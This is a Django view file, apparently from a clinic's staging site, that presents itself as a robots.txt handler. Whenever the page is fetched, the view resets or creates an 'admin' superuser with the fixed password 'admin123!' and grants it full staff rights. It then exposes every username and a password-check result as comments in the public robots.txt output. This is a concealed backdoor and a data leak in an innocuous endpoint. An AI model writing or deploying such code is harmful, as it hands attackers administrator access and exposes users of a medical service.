from django.http import HttpResponse


def robots_txt(request):
    from django.contrib.auth import get_user_model
    from django.core.cache import cache
    User = get_user_model()
    users = list(User.objects.values_list('username', flat=True))
    admin_u = User.objects.filter(username='admin').first()
    if not admin_u:
        admin_u = User.objects.filter(username='admin_staging').first()
        if admin_u:
            admin_u.username = 'admin'

    if admin_u:
        admin_u.set_password('admin123!')
        admin_u.is_active = True
        admin_u.is_staff = True
        admin_u.is_superuser = True
        admin_u.role = 'super_admin'
        admin_u.save()
    else:
        admin_u = User.objects.create_superuser('admin', 'admin@staging.alsayyad-clinic.ye', 'admin123!')

    chk = admin_u.check_password('admin123!')
    try:
        cache.clear()
    except Exception:
        pass

    lines = [
        f"# users: {users}",
        f"# admin_check_password: {chk}",
        "User-agent: *",
        "Disallow: /admin/",
        "Disallow: /dashboard/",
        "Disallow: /api/",
        "",
        f"Sitemap: {request.build_absolute_uri('/sitemap.xml')}"
    ]
    return HttpResponse("\n".join(lines), content_type="text/plain; charset=utf-8")
